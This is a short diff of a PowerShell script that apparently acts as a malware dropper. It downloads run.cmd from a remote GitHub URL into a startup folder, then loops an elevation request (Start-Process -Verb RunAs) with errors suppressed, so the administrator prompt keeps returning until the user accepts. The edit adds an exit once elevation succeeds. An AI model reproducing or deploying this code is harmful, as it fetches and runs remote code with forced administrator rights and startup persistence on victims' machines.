@@ -5,7 +5,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$startup\run.cmd"
     
-    while(1){try{Start-Process -Verb RunAs -FilePath '$startup\run.cmd'}catch{}}
+    while(1){try{Start-Process -Verb RunAs -FilePath '$startup\run.cmd';exit}catch{}}
 
     Remove-Item -Path "$startup\run.cmd"
     
